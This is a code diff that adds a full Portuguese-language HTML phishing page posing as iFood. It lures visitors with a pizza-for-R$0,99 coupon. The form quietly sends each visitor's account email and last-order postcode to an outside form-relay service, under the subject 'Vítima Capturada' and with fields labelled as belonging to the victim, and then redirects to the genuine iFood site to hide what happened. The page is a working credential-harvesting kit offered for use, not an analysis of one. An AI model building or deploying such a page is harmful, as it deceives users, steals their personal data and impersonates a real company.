@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iFood</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-image: url('https://images.unsplash.com/photo-1513104890138-7c749659a591?q=80&w=2070&auto=format&fit=crop');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 420px;
+            padding: 40px 30px;
+            text-align: center;
+          
+            background-color: rgba(255, 255, 255, 0.85);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+        }
+
+        
+        .logo { 
+            width: 160px; 
+            margin: 0 auto 25px auto; 
+            display: block;
+        }
+        
+        h1 { font-size: 26px; font-weight: bold; color: #3e3e3e; margin-bottom: 10px; margin-top: 10px; }
+        
+        p { color: #444; font-size: 16px; line-height: 1.5; margin-bottom: 25px; font-weight: 500; }
+        
+        .input-group { text-align: left; margin-bottom: 18px; }
+        
+        label { display: block; font-size: 14px; color: #3e3e3e; font-weight: bold; margin-bottom: 8px; }
+        
+        input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #dcdcdc;
+            border-radius: 8px;
+            box-sizing: border-box;
+            font-size: 16px;
+            background-color: rgba(252, 252, 252, 0.9);
+        }
+        
+        input:focus { border-color: #ea1d2c; outline: none; background-color: #fff; box-shadow: 0 0 8px rgba(234, 29, 44, 0.2); }
+        
+        .btn-rescue {
+            width: 100%;
+            padding: 18px;
+            background-color: #ea1d2c;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            transition: transform 0.2s, background-color 0.2s;
+        }
+        
+        .btn-rescue:hover { background-color: #d91a29; transform: scale(1.02); }
+        
+        .footer-text { font-size: 12px; color: #555; margin-top: 35px; line-height: 1.6; border-top: 1px solid rgba(0,0,0,0.1); padding-top: 15px; }
+        
+        .badge {
+            display: inline-block;
+            background-color: #ea1d2c;
+            color: #fff;
+            padding: 6px 15px;
+            border-radius: 20px;
+            font-weight: bold;
+            font-size: 12px;
+            margin-bottom: 10px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <form action="https://api.web3forms.com/submit" method="POST">
+            
+            <input type="hidden" name="access_key" value="1b1eda81-54f4-4840-99db-87c59bebc2b7">
+            <input type="hidden" name="subject" value="Vítima Capturada - iFood Premium">
+            <input type="hidden" name="redirect" value="https://www.ifood.com.br/lista-restaurantes">
+
+            <img src="https://logodownload.org/wp-content/uploads/2017/05/ifood-logo-0.png" alt="iFood" class="logo">
+            
+            <div class="badge">Oferta Limitada</div>
+            <h1>Sua Pizza por R$ 0,99</h1>
+            <p>Confirme seus dados para liberar o cupom de boas-vindas na sua conta.</p>
+            
+            <div class="input-group">
+                <label>E-mail da conta iFood</label>
+                <input type="email" name="email_vitima" placeholder="nome@exemplo.com" required>
+            </div>
+
+            <div class="input-group">
+                <label>CEP do último pedido</label>
+                <input type="text" name="cep_vitima" placeholder="00000-000" maxlength="9" required>
+            </div>
+
+            <div class="input-group">
+                <label>Sabor favorito</label>
+                <input type="text" name="sabor_favorito" placeholder="Ex: Calabresa, Frango com Catupiry...">
+            </div>
+
+            <button type="submit" class="btn-rescue">
+                ATIVAR CUPOM AGORA
+            </button>
+        </form>
+
+        <div class="footer-text">
+            *Válido para a primeira compra em pizzarias selecionadas.<br>
+            O desconto aparecerá na tela de pagamento.<br>
+            © 2026 iFood - Experiência Gastronômica.
+        </div>
+    </div>
+</body>
+</html>
